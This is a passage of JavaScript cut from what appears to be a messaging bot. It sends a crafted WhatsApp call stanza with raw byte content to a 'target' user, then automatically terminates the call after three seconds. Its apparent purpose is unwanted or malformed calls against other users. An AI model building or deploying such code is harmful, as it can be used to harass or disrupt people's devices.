            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]),
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                  ),
                },
              ]
            : []),
        ],
      },
    ],
  };
  await sock.sendNode(callNode);
  setTimeout(async () => {
    try {
      await sock.sendNode({
        tag: "call",
        attrs: {
          to: target,
          id: sock.generateMessageTag(),
          from: sock.user.id
        },
        content: [{
          tag: "terminate",
          attrs: {
            "call-id": callId,
            reason: "success"
          }
        }]
      });
    } catch {}
  }, 3000);
}

//And The Function


bot.launch()
